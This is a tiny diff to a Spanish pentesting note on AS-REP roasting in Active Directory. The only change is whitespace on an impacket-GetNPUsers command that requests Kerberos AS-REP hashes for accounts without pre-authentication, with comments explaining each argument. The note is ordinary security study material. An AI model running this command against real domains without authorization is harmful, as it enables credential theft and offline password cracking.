@@ -12,7 +12,7 @@ Tags: #AD #ASREProstable #Impacket #Kali #Parrot #HashCat
 ```
 
 ```bash 
-❯ impacket-GetNPUsers 'domain1.corp/user' -no-pass -dc-ip <IP> -request         
+❯ impacket-GetNPUsers 'domain1.corp/user' -no-pass -dc-ip <IP> -request        
 	# Con un usuario válido 
 	# domain1.corp/user = Usuario vulnerable o lista de usuarios 
 	# no-pass = No hay una contraseña 
